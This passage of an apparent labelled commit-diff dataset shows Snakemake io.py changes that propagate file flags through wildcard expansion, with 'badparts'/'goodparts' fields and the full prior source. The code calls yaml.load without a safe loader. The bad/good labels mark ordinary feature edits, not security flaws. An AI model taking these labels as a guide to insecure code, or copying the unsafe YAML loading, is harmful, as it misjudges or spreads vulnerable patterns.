remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n", "add": 3, "remove": 2, "filename": "/snakemake/io.py", "badparts": ["    def touch(self):", "            lutime(self.file, None)"], "goodparts": ["    def touch(self, times=None):", "        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"", "            lutime(self.file, times)"]}, {"diff": "\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n", "add": 12, "remove": 2, "filename": "/snakemake/io.py", "badparts": ["        return IOFile(apply_wildcards(f, wildcards,", "                      rule=self.rule)"], "goodparts": ["        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})", "        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,", "                                      rule=self.rule)", "        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))", "        return fileWithWildcardsApplied"]}, {"diff": "\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n", "add": 9, "remove": 1, "filename": "/snakemake/io.py", "badparts": ["        return flag in value.flags"], "goodparts": ["        return flag in value.flags and value.flags[flag]", "    if isinstance(value, _IOFile):", "        return flag in value.flags and value.flags[flag]", "def get_flag_value(value, flag_type):", "    if isinstance(value, AnnotatedString):", "        if flag_type in value.flags:", "            return value.flags[flag_type]", "        else:", "            return None"]}, {"diff": "\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n", "add": 1, "remove": 1, "filename": "/snakemake/io.py", "badparts": ["    annotated = flag(value, \"dynamic\")"], "goodparts": ["    annotated = flag(value, \"dynamic\", True)"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import stat import time import json from itertools import product, chain from collections import Iterable, namedtuple from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError from snakemake.logging import logger def lstat(f): return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks) def lutime(f, times): return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks) def lchmod(f, mode): return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks) def IOFile(file, rule=None): f=_IOFile(file) f.rule=rule return f class _IOFile(str): \"\"\" A file that is either input or output of a rule. \"\"\" dynamic_fill=\"__snakemake_dynamic__\" def __new__(cls, file): obj=str.__new__(cls, file) obj._is_function=type(file).__name__==\"function\" obj._file=file obj.rule=None obj._regex=None return obj @property def file(self): if not self._is_function: return self._file else: raise ValueError(\"This IOFile is specified as a function and \" \"may not be used directly.\") @property def exists(self): return os.path.exists(self.file) @property def protected(self): return self.exists and not os.access(self.file, os.W_OK) @property def mtime(self): return lstat(self.file).st_mtime @property def size(self): self.check_broken_symlink() return os.path.getsize(self.file) def check_broken_symlink(self): \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\" if not self.exists and lstat(self.file): raise WorkflowError(\"File{} seems to be a broken symlink.\".format(self.file)) def is_newer(self, time): return self.mtime > time def prepare(self): path_until_wildcard=re.split(self.dynamic_fill, self.file)[0] dir=os.path.dirname(path_until_wildcard) if len(dir) > 0 and not os.path.exists(dir): try: os.makedirs(dir) except OSError as e: if e.errno !=17: raise e def protect(self): mode=(lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~ stat.S_IWOTH) if os.path.isdir(self.file): for root, dirs, files in os.walk(self.file): for d in dirs: lchmod(os.path.join(self.file, d), mode) for f in files: lchmod(os.path.join(self.file, f), mode) else: lchmod(self.file, mode) def remove(self): remove(self.file) def touch(self): try: lutime(self.file, None) except OSError as e: if e.errno==2: raise MissingOutputException( \"Output file{} of rule{} shall be touched but \" \"does not exist.\".format(self.file, self.rule.name), lineno=self.rule.lineno, snakefile=self.rule.snakefile) else: raise e def touch_or_create(self): try: self.touch() except MissingOutputException: with open(self.file, \"w\") as f: pass def apply_wildcards(self, wildcards, fill_missing=False, fail_dynamic=False): f=self._file if self._is_function: f=self._file(Namedlist(fromdict=wildcards)) return IOFile(apply_wildcards(f, wildcards, fill_missing=fill_missing, fail_dynamic=fail_dynamic, dynamic_fill=self.dynamic_fill), rule=self.rule) def get_wildcard_names(self): return get_wildcard_names(self.file) def contains_wildcard(self): return contains_wildcard(self.file) def regex(self): if self._regex is None: self._regex=re.compile(regex(self.file)) return self._regex def constant_prefix(self): first_wildcard=_wildcard_regex.search(self.file) if first_wildcard: return self.file[:first_wildcard.start()] return self.file def match(self, target): return self.regex().match(target) or None def format_dynamic(self): return self.replace(self.dynamic_fill, \"{*}\") def __eq__(self, other): f=other._file if isinstance(other, _IOFile) else other return self._file==f def __hash__(self): return self._file.__hash__() _wildcard_regex=re.compile( \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\") def wait_for_files(files, latency_wait=3): \"\"\"Wait for given files to be present in filesystem.\"\"\" files=list(files) get_missing=lambda:[f for f in files if not os.path.exists(f)] missing=get_missing() if missing: logger.info(\"Waiting at most{} seconds for missing files.\".format( latency_wait)) for _ in range(latency_wait): if not get_missing(): return time.sleep(1) raise IOError(\"Missing files after{} seconds:\\n{}\".format( latency_wait, \"\\n\".join(get_missing()))) def get_wildcard_names(pattern): return set(match.group('name') for match in _wildcard_regex.finditer(pattern)) def contains_wildcard(path): return _wildcard_regex.search(path) is not None def remove(file): if os.path.exists(file): if os.path.isdir(file): try: os.removedirs(file) except OSError: pass else: os.remove(file) def regex(filepattern): f=[] last=0 wildcards=set() for match in _wildcard_regex.finditer(filepattern): f.append(re.escape(filepattern[last:match.start()])) wildcard=match.group(\"name\") if wildcard in wildcards: if match.group(\"constraint\"): raise ValueError( \"If multiple wildcards of the same name \" \"appear in a string, eventual constraints have to be defined \" \"at the first occurence and will be inherited by the others.\") f.append(\"(?P={})\".format(wildcard)) else: wildcards.add(wildcard) f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if match.group(\"constraint\") else \".+\")) last=match.end() f.append(re.escape(filepattern[last:])) f.append(\"$\") return \"\".join(f) def apply_wildcards(pattern, wildcards, fill_missing=False, fail_dynamic=False, dynamic_fill=None, keep_dynamic=False): def format_match(match): name=match.group(\"name\") try: value=wildcards[name] if fail_dynamic and value==dynamic_fill: raise WildcardError(name) return str(value) except KeyError as ex: if keep_dynamic: return \"{{{}}}\".format(name) elif fill_missing: return dynamic_fill else: raise WildcardError(str(ex)) return re.sub(_wildcard_regex, format_match, pattern) def not_iterable(value): return isinstance(value, str) or not isinstance(value, Iterable) class AnnotatedString(str): def __init__(self, value): self.flags=dict() def flag(value, flag_type, flag_value=True): if isinstance(value, AnnotatedString): value.flags[flag_type]=flag_value return value if not_iterable(value): value=AnnotatedString(value) value.flags[flag_type]=flag_value return value return[flag(v, flag_type, flag_value=flag_value) for v in value] def is_flagged(value, flag): if isinstance(value, AnnotatedString): return flag in value.flags return False def temp(value): \"\"\" A flag for an input or output file that shall be removed after usage. \"\"\" if is_flagged(value, \"protected\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"temp\") def temporary(value): \"\"\" An alias for temp. \"\"\" return temp(value) def protected(value): \"\"\" A flag for a file that shall be write protected after creation. \"\"\" if is_flagged(value, \"temp\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"protected\") def dynamic(value): \"\"\" A flag for a file that shall be dynamic, i.e. the multiplicity (and wildcard values) will be expanded after a certain rule has been run \"\"\" annotated=flag(value, \"dynamic\") tocheck=[annotated] if not_iterable(annotated) else annotated for file in tocheck: matches=list(_wildcard_regex.finditer(file)) for match in matches: if match.group(\"constraint\"): raise SyntaxError( \"The wildcards in dynamic files cannot be constrained.\") return annotated def touch(value): return flag(value, \"touch\") def expand(*args, **wildcards): \"\"\" Expand wildcards in given filepatterns. Arguments *args --first arg: filepatterns as list or one single filepattern, second arg(optional): a function to combine wildcard values (itertools.product per default) **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" filepatterns=args[0] if len(args)==1: combinator=product elif len(args)==2: combinator=args[1] if isinstance(filepatterns, str): filepatterns=[filepatterns] def flatten(wildcards): for wildcard, values in wildcards.items(): if isinstance(values, str) or not isinstance(values, Iterable): values=[values] yield[(wildcard, value) for value in values] try: return[filepattern.format(**comb) for comb in map(dict, combinator(*flatten(wildcards))) for filepattern in filepatterns] except KeyError as e: raise WildcardError(\"No values given for wildcard{}.\".format(e)) def limit(pattern, **wildcards): \"\"\" Limit wildcards to the given values. Arguments: **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" return pattern.format(**{ wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values)) for wildcard, values in wildcards.items() }) def glob_wildcards(pattern): \"\"\" Glob the values of the wildcards by matching the given pattern to the filesystem. Returns a named tuple with a list of values for each wildcard. \"\"\" pattern=os.path.normpath(pattern) first_wildcard=re.search(\"{[^{]\", pattern) dirname=os.path.dirname(pattern[:first_wildcard.start( )]) if first_wildcard else os.path.dirname(pattern) if not dirname: dirname=\".\" names=[match.group('name') for match in _wildcard_regex.finditer(pattern)] Wildcards=namedtuple(\"Wildcards\", names) wildcards=Wildcards(*[list() for name in names]) pattern=re.compile(regex(pattern)) for dirpath, dirnames, filenames in os.walk(dirname): for f in chain(filenames, dirnames): if dirpath !=\".\": f=os.path.join(dirpath, f) match=re.match(pattern, f) if match: for name, value in match.groupdict().items(): getattr(wildcards, name).append(value) return wildcards class Namedlist(list): \"\"\" A list that additionally provides functions to name items. Further, it is hashable, however the hash does not consider the item names. \"\"\" def __init__(self, toclone=None, fromdict=None, plainstr=False): \"\"\" Create the object. Arguments toclone --another Namedlist that shall be cloned fromdict --a dict that shall be converted to a Namedlist(keys become names) \"\"\" list.__init__(self) self._names=dict() if toclone: self.extend(map(str, toclone) if plainstr else toclone) if isinstance(toclone, Namedlist): self.take_names(toclone.get_names()) if fromdict: for key, item in fromdict.items(): self.append(item) self.add_name(key) def add_name(self, name): \"\"\" Add a name to the last item. Arguments name --a name \"\"\" self.set_name(name, len(self) -1) def set_name(self, name, index, end=None): \"\"\" Set the name of an item. Arguments name --a name index --the item index \"\"\" self._names[name]=(index, end) if end is None: setattr(self, name, self[index]) else: setattr(self, name, Namedlist(toclone=self[index:end])) def get_names(self): \"\"\" Get the defined names as(name, index) pairs. \"\"\" for name, index in self._names.items(): yield name, index def take_names(self, names): \"\"\" Take over the given names. Arguments names --the given names as(name, index) pairs \"\"\" for name,(i, j) in names: self.set_name(name, i, end=j) def items(self): for name in self._names: yield name, getattr(self, name) def allitems(self): next=0 for name, index in sorted(self._names.items(), key=lambda item: item[1][0]): start, end=index if end is None: end=start +1 if start > next: for item in self[next:start]: yield None, item yield name, getattr(self, name) next=end for item in self[next:]: yield None, item def insert_items(self, index, items): self[index:index +1]=items add=len(items) -1 for name,(i, j) in self._names.items(): if i > index: self._names[name]=(i +add, j +add) elif i==index: self.set_name(name, i, end=i +len(items)) def keys(self): return self._names def plainstrings(self): return self.__class__.__call__(toclone=self, plainstr=True) def __getitem__(self, key): try: return super().__getitem__(key) except TypeError: pass return getattr(self, key) def __hash__(self): return hash(tuple(self)) def __str__(self): return \" \".join(map(str, self)) class InputFiles(Namedlist): pass class OutputFiles(Namedlist): pass class Wildcards(Namedlist): pass class Params(Namedlist): pass class Resources(Namedlist): pass class Log(Namedlist): pass def _load_configfile(configpath): \"Tries to load a configfile first as JSON, then as YAML, into a dict.\" try: with open(configpath) as f: try: return json.load(f) except ValueError: f.seek(0) try: import yaml except ImportError: raise WorkflowError(\"Config file is not valid JSON and PyYAML \" \"has not been installed. Please install \" \"PyYAML to use YAML config files.\") try: return yaml.load(f) except yaml.YAMLError: raise WorkflowError(\"Config file is not valid JSON or YAML.\") except FileNotFoundError: raise WorkflowError(\"Config file{} not found.\".format(configpath)) def load_configfile(configpath): \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\" config=_load_configfile(configpath) if not isinstance(config, dict): raise WorkflowError(\"Config file must be given as JSON or YAML \" \"with keys at top level.\") return config class PeriodicityDetector: def __init__(self, min_repeat=50, max_repeat=100): \"\"\" Args: max_len(int): The maximum length of the periodic substring. \"\"\" self.regex=re.compile( \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format( min_repeat=min_repeat -1, max_repeat=max_repeat -1)) def is_periodic(self, value): \"\"\"Returns the periodic substring or None if not periodic.\"\"\" m=self.regex.search(value) if m is not None: return m.group(\"value\") ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport stat\nimport time\nimport json\nfrom itertools import product, chain\nfrom collections import Iterable, namedtuple\nfrom snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\nfrom snakemake.logging import logger\n\n\ndef lstat(f):\n    return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n\n\ndef lutime(f, times):\n    return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks)\n\n\ndef lchmod(f, mode):\n    return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks)\n\n\ndef IOFile(file, rule=None):\n    f = _IOFile(file)\n    f.rule = rule\n    return f\n\n\nclass _IOFile(str):\n    \"\"\"\n    A file that is either input or output of a rule.\n    \"\"\"\n\n    dynamic_fill = \"__snakemake_dynamic__\"\n\n    def __new__(cls, file):\n        obj = str.__new__(cls, file)\n        obj._is_function = type(file).__name__ == \"function\"\n        obj._file = file\n        obj.rule = None\n        obj._regex = None\n        return obj\n\n    @property\n    def file(self):\n        if not self._is_function:\n            return self._file\n        else:\n            raise ValueError(\"This IOFile is specified as a function and \"\n                             \"may not be used directly.\")\n\n    @property\n    def exists(self):\n        return os.path.exists(self.file)\n\n    @property\n    def protected(self):\n        return self.exists and not os.access(self.file, os.W_OK)\n\n    @property\n    def mtime(self):\n        # do not follow symlinks for modification time\n        return lstat(self.file).st_mtime\n\n    @property\n    def size(self):\n        # follow symlinks but throw error if invalid\n        self.check_broken_symlink()\n        return os.path.getsize(self.file)\n\n    def check_broken_symlink(self):\n        \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n        if not self.exists and lstat(self.file):\n            raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n\n    def is_newer(self, time):\n        return self.mtime > time\n\n    def prepare(self):\n        path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n        dir = os.path.dirname(path_until_wildcard)\n        if len(dir) > 0 and not os.path.exists(dir):\n            try:\n                os.makedirs(dir)\n            except OSError as e:\n                # ignore Errno 17 \"File exists\" (reason: multiprocessing)\n                if e.errno != 17:\n                    raise e\n\n    def protect(self):\n        mode = (lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~\n                stat.S_IWOTH)\n        if os.path.isdir(self.file):\n            for root, dirs, files in os.walk(self.file):\n                for d in dirs:\n                    lchmod(os.path.join(self.file, d), mode)\n                for f in files:\n                    lchmod(os.path.join(self.file, f), mode)\n        else:\n            lchmod(self.file, mode)\n\n    def remove(self):\n        remove(self.file)\n\n    def touch(self):\n        try:\n            lutime(self.file, None)\n        except OSError as e:\n            if e.errno == 2:\n                raise MissingOutputException(\n                    \"Output file {} of rule {} shall be touched but \"\n                    \"does not exist.\".format(self.file, self.rule.name),\n                    lineno=self.rule.lineno,\n                    snakefile=self.rule.snakefile)\n            else:\n                raise e\n\n    def touch_or_create(self):\n        try:\n            self.touch()\n        except MissingOutputException:\n            # create empty file\n            with open(self.file, \"w\") as f:\n                pass\n\n    def apply_wildcards(self, wildcards,\n                        fill_missing=False,\n                        fail_dynamic=False):\n        f = self._file\n        if self._is_function:\n            f = self._file(Namedlist(fromdict=wildcards))\n\n        return IOFile(apply_wildcards(f, wildcards,\n                                      fill_missing=fill_missing,\n                                      fail_dynamic=fail_dynamic,\n                                      dynamic_fill=self.dynamic_fill),\n                      rule=self.rule)\n\n    def get_wildcard_names(self):\n        return get_wildcard_names(self.file)\n\n    def contains_wildcard(self):\n        return contains_wildcard(self.file)\n\n    def regex(self):\n        if self._regex is None:\n            # compile a regular expression\n            self._regex = re.compile(regex(self.file))\n        return self._regex\n\n    def constant_prefix(self):\n        first_wildcard = _wildcard_regex.search(self.file)\n        if first_wildcard:\n            return self.file[:first_wildcard.start()]\n        return self.file\n\n    def match(self, target):\n        return self.regex().match(target) or None\n\n    def format_dynamic(self):\n        return self.replace(self.dynamic_fill, \"{*}\")\n\n    def __eq__(self, other):\n        f = other._file if isinstance(other, _IOFile) else other\n        return self._file == f\n\n    def __hash__(self):\n        return self._file.__hash__()\n\n\n_wildcard_regex = re.compile(\n    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\")\n\n#    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>[^\\}]*))?\\s*\\}\")\n\n\ndef wait_for_files(files, latency_wait=3):\n    \"\"\"Wait for given files to be present in filesystem.\"\"\"\n    files = list(files)\n    get_missing = lambda: [f for f in files if not os.path.exists(f)]\n    missing = get_missing()\n    if missing:\n        logger.info(\"Waiting at most {} seconds for missing files.\".format(\n            latency_wait))\n        for _ in range(latency_wait):\n            if not get_missing():\n                return\n            time.sleep(1)\n        raise IOError(\"Missing files after {} seconds:\\n{}\".format(\n            latency_wait, \"\\n\".join(get_missing())))\n\n\ndef get_wildcard_names(pattern):\n    return set(match.group('name')\n               for match in _wildcard_regex.finditer(pattern))\n\n\ndef contains_wildcard(path):\n    return _wildcard_regex.search(path) is not None\n\n\ndef remove(file):\n    if os.path.exists(file):\n        if os.path.isdir(file):\n            try:\n                os.removedirs(file)\n            except OSError:\n                # ignore non empty directories\n                pass\n        else:\n            os.remove(file)\n\n\ndef regex(filepattern):\n    f = []\n    last = 0\n    wildcards = set()\n    for match in _wildcard_regex.finditer(filepattern):\n        f.append(re.escape(filepattern[last:match.start()]))\n        wildcard = match.group(\"name\")\n        if wildcard in wildcards:\n            if match.group(\"constraint\"):\n                raise ValueError(\n                    \"If multiple wildcards of the same name \"\n                    \"appear in a string, eventual constraints have to be defined \"\n                    \"at the first occurence and will be inherited by the others.\")\n            f.append(\"(?P={})\".format(wildcard))\n        else:\n            wildcards.add(wildcard)\n            f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if\n                                         match.group(\"constraint\") else \".+\"))\n        last = match.end()\n    f.append(re.escape(filepattern[last:]))\n    f.append(\"$\")  # ensure that the match spans the whole file\n    return \"\".join(f)\n\n\ndef apply_wildcards(pattern, wildcards,\n                    fill_missing=False,\n                    fail_dynamic=False,\n                    dynamic_fill=None,\n                    keep_dynamic=False):\n    def format_match(match):\n        name = match.group(\"name\")\n        try:\n            value = wildcards[name]\n            if fail_dynamic and value == dynamic_fill:\n                raise WildcardError(name)\n            return str(value)  # convert anything into a str\n        except KeyError as ex:\n            if keep_dynamic:\n                return \"{{{}}}\".format(name)\n            elif fill_missing:\n                return dynamic_fill\n            else:\n                raise WildcardError(str(ex))\n\n    return re.sub(_wildcard_regex, format_match, pattern)\n\n\ndef not_iterable(value):\n    return isinstance(value, str) or not isinstance(value, Iterable)\n\n\nclass AnnotatedString(str):\n    def __init__(self, value):\n        self.flags = dict()\n\n\ndef flag(value, flag_type, flag_value=True):\n    if isinstance(value, AnnotatedString):\n        value.flags[flag_type] = flag_value\n        return value\n    if not_iterable(value):\n        value = AnnotatedString(value)\n        value.flags[flag_type] = flag_value\n        return value\n    return [flag(v, flag_type, flag_value=flag_value) for v in value]\n\n\ndef is_flagged(value, flag):\n    if isinstance(value, AnnotatedString):\n        return flag in value.flags\n    return False\n\n\ndef temp(value):\n    \"\"\"\n    A flag for an input or output file that shall be removed after usage.\n    \"\"\"\n    if is_flagged(value, \"protected\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"temp\")\n\n\ndef temporary(value):\n    \"\"\" An alias for temp. \"\"\"\n    return temp(value)\n\n\ndef protected(value):\n    \"\"\" A flag for a file that shall be write protected after creation. \"\"\"\n    if is_flagged(value, \"temp\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"protected\")\n\n\ndef dynamic(value):\n    \"\"\"\n    A flag for a file that shall be dynamic, i.e. the multiplicity\n    (and wildcard values) will be expanded after a certain\n    rule has been run \"\"\"\n    annotated = flag(value, \"dynamic\")\n    tocheck = [annotated] if not_iterable(annotated) else annotated\n    for file in tocheck:\n        matches = list(_wildcard_regex.finditer(file))\n        #if len(matches) != 1:\n        #    raise SyntaxError(\"Dynamic files need exactly one wildcard.\")\n        for match in matches:\n            if match.group(\"constraint\"):\n                raise SyntaxError(\n                    \"The wildcards in dynamic files cannot be constrained.\")\n    return annotated\n\n\ndef touch(value):\n    return flag(value, \"touch\")\n\n\ndef expand(*args, **wildcards):\n    \"\"\"\n    Expand wildcards in given filepatterns.\n\n    Arguments\n    *args -- first arg: filepatterns as list or one single filepattern,\n        second arg (optional): a function to combine wildcard values\n        (itertools.product per default)\n    **wildcards -- the wildcards as keyword arguments\n        with their values as lists\n    \"\"\"\n    filepatterns = args[0]\n    if len(args) == 1:\n        combinator = product\n    elif len(args) == 2:\n        combinator = args[1]\n    if isinstance(filepatterns, str):\n        filepatterns = [filepatterns]\n\n    def flatten(wildcards):\n        for wildcard, values in wildcards.items():\n            if isinstance(values, str) or not isinstance(values, Iterable):\n                values = [values]\n            yield [(wildcard, value) for value in values]\n\n    try:\n        return [filepattern.format(**comb)\n                for comb in map(dict, combinator(*flatten(wildcards))) for\n                filepattern in filepatterns]\n    except KeyError as e:\n        raise WildcardError(\"No values given for wildcard {}.\".format(e))\n\n\ndef limit(pattern, **wildcards):\n    \"\"\"\n    Limit wildcards to the given values.\n\n    Arguments:\n    **wildcards -- the wildcards as keyword arguments\n                   with their values as lists\n    \"\"\"\n    return pattern.format(**{\n        wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values))\n        for wildcard, values in wildcards.items()\n    })\n\n\ndef glob_wildcards(pattern):\n    \"\"\"\n    Glob the values of the wildcards by matching the given pattern to the filesystem.\n    Returns a named tuple with a list of values for each wildcard.\n    \"\"\"\n    pattern = os.path.normpath(pattern)\n    first_wildcard = re.search(\"{[^{]\", pattern)\n    dirname = os.path.dirname(pattern[:first_wildcard.start(\n    )]) if first_wildcard else os.path.dirname(pattern)\n    if not dirname:\n        dirname = \".\"\n\n    names = [match.group('name')\n             for match in _wildcard_regex.finditer(pattern)]\n    Wildcards = namedtuple(\"Wildcards\", names)\n    wildcards = Wildcards(*[list() for name in names])\n\n    pattern = re.compile(regex(pattern))\n    for dirpath, dirnames, filenames in os.walk(dirname):\n        for f in chain(filenames, dirnames):\n            if dirpath != \".\":\n                f = os.path.join(dirpath, f)\n            match = re.match(pattern, f)\n            if match:\n                for name, value in match.groupdict().items():\n                    getattr(wildcards, name).append(value)\n    return wildcards\n\n\n# TODO rewrite Namedlist!\nclass Namedlist(list):\n    \"\"\"\n    A list that additionally provides functions to name items. Further,\n    it is hashable, however the hash does not consider the item names.\n    \"\"\"\n\n    def __init__(self, toclone=None, fromdict=None, plainstr=False):\n        \"\"\"\n        Create the object.\n\n        Arguments\n        toclone  -- another Namedlist that shall be cloned\n        fromdict -- a dict that shall be converted to a\n            Namedlist (keys become names)\n        \"\"\"\n        list.__init__(self)\n        self._names = dict()\n\n        if toclone:\n            self.extend(map(str, toclone) if plainstr else toclone)\n            if isinstance(toclone, Namedlist):\n                self.take_names(toclone.get_names())\n        if fromdict:\n            for key, item in fromdict.items():\n                self.append(item)\n                self.add_name(key)\n\n    def add_name(self, name):\n        \"\"\"\n        Add a name to the last item.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        self.set_name(name, len(self) - 1)\n\n    def set_name(self, name, index, end=None):\n        \"\"\"\n        Set the name of an item.\n\n        Arguments\n        name  -- a name\n        index -- the item index\n        \"\"\"\n        self._names[name] = (index, end)\n        if end is None:\n            setattr(self, name, self[index])\n        else:\n            setattr(self, name, Namedlist(toclone=self[index:end]))\n\n    def get_names(self):\n        \"\"\"\n        Get the defined names as (name, index) pairs.\n        \"\"\"\n        for name, index in self._names.items():\n            yield name, index\n\n    def take_names(self, names):\n        \"\"\"\n        Take over the given names.\n\n        Arguments\n        names -- the given names as (name, index) pairs\n        \"\"\"\n        for name, (i, j) in names:\n            self.set_name(name, i, end=j)\n\n    def items(self):\n        for name in self._names:\n            yield name, getattr(self, name)\n\n    def allitems(self):\n        next = 0\n        for name, index in sorted(self._names.items(),\n                                  key=lambda item: item[1][0]):\n            start, end = index\n            if end is None:\n                end = start + 1\n            if start > next:\n                for item in self[next:start]:\n                    yield None, item\n            yield name, getattr(self, name)\n            next = end\n        for item in self[next:]:\n            yield None, item\n\n    def insert_items(self, index, items):\n        self[index:index + 1] = items\n        add = len(items) - 1\n        for name, (i, j) in self._names.items():\n            if i > index:\n                self._names[name] = (i + add, j + add)\n            elif i == index:\n                self.set_name(name, i, end=i + len(items))\n\n    def keys(self):\n        return self._names\n\n    def plainstrings(self):\n        return self.__class__.__call__(toclone=self, plainstr=True)\n\n    def __getitem__(self, key):\n        try:\n            return super().__getitem__(key)\n        except TypeError:\n            pass\n        return getattr(self, key)\n\n    def __hash__(self):\n        return hash(tuple(self))\n\n    def __str__(self):\n        return \" \".join(map(str, self))\n\n\nclass InputFiles(Namedlist):\n    pass\n\n\nclass OutputFiles(Namedlist):\n    pass\n\n\nclass Wildcards(Namedlist):\n    pass\n\n\nclass Params(Namedlist):\n    pass\n\n\nclass Resources(Namedlist):\n    pass\n\n\nclass Log(Namedlist):\n    pass\n\n\ndef _load_configfile(configpath):\n    \"Tries to load a configfile first as JSON, then as YAML, into a dict.\"\n    try:\n        with open(configpath) as f:\n            try:\n                return json.load(f)\n            except ValueError:\n                f.seek(0)  # try again\n            try:\n                import yaml\n            except ImportError:\n                raise WorkflowError(\"Config file is not valid JSON and PyYAML \"\n                                    \"has not been installed. Please install \"\n                                    \"PyYAML to use YAML config files.\")\n            try:\n                return yaml.load(f)\n            except yaml.YAMLError:\n                raise WorkflowError(\"Config file is not valid JSON or YAML.\")\n    except FileNotFoundError:\n        raise WorkflowError(\"Config file {} not found.\".format(configpath))\n\n\ndef load_configfile(configpath):\n    \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\"\n    config = _load_configfile(configpath)\n    if not isinstance(config, dict):\n        raise WorkflowError(\"Config file must be given as JSON or YAML \"\n                            \"with keys at top level.\")\n    return config\n\n##### Wildcard pumping detection #####\n\n\nclass PeriodicityDetector:\n    def __init__(self, min_repeat=50, max_repeat=100):\n        \"\"\"\n        Args:\n            max_len (int): The maximum length of the periodic substring.\n        \"\"\"\n        self.regex = re.compile(\n            \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format(\n                min_repeat=min_repeat - 1,\n                max_repeat=max_repeat - 1))\n\n    def is_periodic(self, value):\n        \"\"\"Returns the periodic substring or None if not periodic.\"\"\"\n        m = self.regex.search(value)  # search for a periodic suffix.\n        if m is not None:\n            return m.group(\"value\")\n"}, "/snakemake/jobs.py": {"changes": [{"diff": "\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n", "add": 1, "remove": 1, "filename": "/snakemake/jobs.py", "badparts": ["from snakemake.io import IOFile, Wildcards, Resources, _IOFile"], "goodparts": ["from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard"]}, {"diff": "\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def 